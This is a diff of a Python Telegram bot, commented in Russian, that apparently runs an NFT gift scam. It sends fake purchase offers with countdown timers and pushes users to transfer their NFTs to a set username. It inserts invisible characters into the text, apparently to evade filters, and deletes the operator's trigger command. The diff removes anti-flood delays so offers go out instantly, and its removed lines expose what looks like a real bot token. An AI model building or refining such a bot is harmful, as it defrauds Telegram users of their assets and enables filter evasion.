@@ -6,16 +6,17 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.enums import ParseMode
 from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.exceptions import TelegramRetryAfter
 
 # Настройки
-TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
+TOKEN = "YOUR_BOT_TOKEN"
 RECIPIENT = "@recipient_username"  # Юзернейм, куда передается НФТ
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# Очередь для защиты от флуда и хранилища кулдаунов / последних сообщений
+# Очередь и хранилища
 message_queue = asyncio.Queue()
 cooldowns = {}          # chat_id -> timestamp последнего запроса
 last_user_messages = {} # chat_id -> message_id последнего сообщения юзера
@@ -76,7 +77,7 @@ LOCALES = {
     }
 }
 
-# Функция безопасного добавления невидимых символов (только для обычного текста)
+# Функция безопасного добавления невидимых символов
 def randomize_text(text: str) -> str:
     invisible_chars = ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"]
     chars = list(text)
@@ -98,7 +99,6 @@ def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     slug = gift_name.replace(" ", "")
     
-    # Изолируем текст от тегов, чтобы Telegram не ломал разметку
     raw_desc = f'Пользователь {loc["offer_text"]} {amount} {currency_symbol} за данный предмет.'
     raw_timer = f'{loc["timer"]} 5 ч. 59 мин.'
     raw_lock = loc["lock"]
@@ -266,13 +266,11 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Фоновый воркер с безопасной задержкой от флуда
+# Воркер с МГНОВЕННОЙ отправкой (без искусственных задержек)
 async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
-            await asyncio.sleep(random.uniform(1.5, 2.5))
-
             text = build_offer_text(
                 task["gift_name"], 
                 task["gift_num"], 
@@ -288,7 +286,7 @@ async def sender_worker():
                 task["lang"]
             )
 
-            # 1. Отправляем оффер
+            # 1. Отправляем оффер сразу
             sent_msg = await bot.send_message(
                 chat_id=task["chat_id"],
                 text=text,
@@ -299,13 +297,19 @@ async def sender_worker():
                 reply_to_message_id=last_user_messages.get(task["chat_id"])
             )
 
-            # 2. Удаляем команду qq
+            # 2. Сразу удаляем команду qq
             if task["bcid"] and sent_msg:
-                await asyncio.sleep(0.3)
                 await bot.delete_business_messages(
                     business_connection_id=task["bcid"],
                     message_ids=[task["cmd_message_id"]]
                 )
+
+        except TelegramRetryAfter as e:
+            # Если Telegram всё же ответит Flood Control'ом — бот автоматически подождет нужное время
+            wait_time = e.retry_after + 1
+            logging.warning(f"Flood control! Waiting for {wait_time} seconds...")
+            await asyncio.sleep(wait_time)
+            await message_queue.put(task)
 
         except Exception as e:
             logging.error(f"Worker execution error: {e}")
